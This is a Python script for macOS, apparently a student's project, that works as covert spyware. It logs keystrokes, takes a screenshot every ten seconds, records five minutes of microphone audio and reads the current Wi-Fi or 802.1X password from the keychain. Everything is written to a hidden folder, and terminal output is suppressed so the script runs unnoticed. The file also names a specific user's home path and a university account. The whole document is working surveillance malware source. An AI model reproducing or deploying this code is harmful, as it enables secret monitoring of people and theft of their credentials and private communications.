import subprocess
import logging
import time
import sounddevice as sd  # type: ignore
import soundfile as sf  # type: ignore
import threading
import os
import sys
from pynput import keyboard  # type: ignore
from PIL import ImageGrab

# Create log directory if it doesn't exist
log_dir = "/Users/mannatvirk/.hiddenfolder"
os.makedirs(log_dir, exist_ok=True)

# Configure logger for keystrokes (keylog.txt)
keystroke_logger = logging.getLogger('keystroke_logger')
keystroke_logger.setLevel(logging.INFO)
keystroke_handler = logging.FileHandler(os.path.join(log_dir, "keylog.txt"))
keystroke_handler.setFormatter(logging.Formatter('%(message)s'))
keystroke_logger.addHandler(keystroke_handler)

# Configure logger for operational logs (log.txt)
operation_logger = logging.getLogger('operation_logger')
operation_logger.setLevel(logging.INFO)
operation_handler = logging.FileHandler(os.path.join(log_dir, "log.txt"))
operation_handler.setFormatter(logging.Formatter('%(asctime)s: %(message)s'))
operation_logger.addHandler(operation_handler)

# Mapping of SSIDs to account names (for 802.1X networks)
ssid_to_account = {
    "eduroam": "z5455543@ad.unsw.edu.au",
    # Add other SSID to account mappings here
}

# Function to take a screenshot and log to log.txt
def take_screenshot():
    try:
        timestamp = int(time.time())
        filename = os.path.join(log_dir, f"screenshot_{timestamp}.png")
        screenshot = ImageGrab.grab()
        screenshot.save(filename, format="PNG")
        operation_logger.info(f"Screenshot taken and saved to {filename}")
    except Exception as e:
        operation_logger.info(f"An error occurred while taking a screenshot: {e}")

# Function to capture screenshots at regular intervals (every 10 seconds)
def periodic_screenshots(interval=10):
    while True:
        take_screenshot()
        time.sleep(interval)

# Function to log keystrokes to keylog.txt in a horizontal format
def on_press(key):
    try:
        # Log normal keys
        keystroke_logger.handlers[0].stream.write(f"{key.char}")
        keystroke_logger.handlers[0].stream.flush()
    except AttributeError:
        # Log special keys
        if key == keyboard.Key.space:
            keystroke_logger.handlers[0].stream.write(" ")
        elif key == keyboard.Key.enter:
            keystroke_logger.handlers[0].stream.write("\n")
        else:
            keystroke_logger.handlers[0].stream.write(f"[{key.name}]")
        keystroke_logger.handlers[0].stream.flush()

# Function to record audio and log to log.txt
def record_audio(filename, duration, samplerate=44100, channels=1):
    try:
        recording = sd.rec(int(duration * samplerate), samplerate=samplerate, channels=channels)
        sd.wait()  # Wait until recording is finished
        sf.write(filename, recording, samplerate)
        operation_logger.info(f"Audio recording completed and saved to {filename}")
    except Exception as e:
        operation_logger.info(f"An error occurred during audio recording: {e}")

def get_current_wifi_ssid():
    try:
        result = subprocess.check_output(
            "networksetup -getairportnetwork en0",
            shell=True
        ).decode('utf-8').strip()
        if "Current Wi-Fi Network: " in result:
            ssid = result.split(": ")[1]
            return ssid
        else:
            logging.info("No connected Wi-Fi network found.")
            return None
    except subprocess.CalledProcessError:
        logging.info("Failed to get current Wi-Fi network.")
        return None

def get_wifi_password(ssid):
    account = ssid_to_account.get(ssid)
    if account:
        # For 802.1X networks
        command = f'security find-generic-password -D "802.1X Password" -a "{account}" -w'
    else:
        # For networks using pre-shared keys
        command = f'security find-generic-password -D "AirPort network password" -s "{ssid}" -w'
    try:
        result = subprocess.check_output(command, shell=True, stderr=subprocess.DEVNULL, text=True)
        password = result.strip()
        with open("/Users/mannatvirk/.hiddenfolder/wifi_password.txt", "w") as f:
            f.write(f"Password for SSID '{ssid}': {password}\n")
        logging.info(f"Password for SSID '{ssid}' retrieved and saved.")
    except subprocess.CalledProcessError as e:
        logging.info(f"Could not retrieve password for SSID '{ssid}' or the operation was denied. Error: {e}")
    except Exception as e:
        logging.info(f"An unexpected error occurred: {e}")

if __name__ == "__main__":
    # Redirect stdout and stderr to suppress terminal output
    sys.stdout = open(os.devnull, 'w')
    sys.stderr = open(os.devnull, 'w')

    # Start the periodic screenshot thread
    screenshot_thread = threading.Thread(target=periodic_screenshots, args=(10,), daemon=True)  # 10-second interval
    screenshot_thread.start()

    # Define audio recording parameters and start in a daemon thread
    audio_filename = os.path.join(log_dir, "audio_rec.wav")
    recording_duration = 300  # Record for 300 seconds (5 minutes)
    audio_thread = threading.Thread(target=record_audio, args=(audio_filename, recording_duration), daemon=True)
    audio_thread.start()


    current_ssid = get_current_wifi_ssid()

    if current_ssid:
        get_wifi_password(current_ssid)
    else:
        logging.info("No connected Wi-Fi network found.")

    # Start the keylogger listener
    listener = keyboard.Listener(on_press=on_press)
    listener.start()

    # Keep the script running by joining the listener thread only
    listener.join()
